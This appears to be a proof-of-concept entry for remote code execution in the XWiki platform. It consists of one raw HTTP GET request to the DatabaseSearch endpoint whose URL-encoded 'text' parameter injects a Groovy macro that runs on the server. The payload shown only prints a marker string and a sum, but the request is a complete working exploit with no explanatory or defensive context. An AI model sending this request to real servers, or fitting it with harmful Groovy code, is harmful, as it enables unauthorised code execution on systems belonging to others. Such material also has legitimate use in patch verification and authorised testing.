# xwiki_DatabaseSearch_rce

from: https://github.com/wy876/POC/blob/main/XWiki-Platform%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
```
GET /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22MiTian%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%288888%20%2B%206666%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)
```
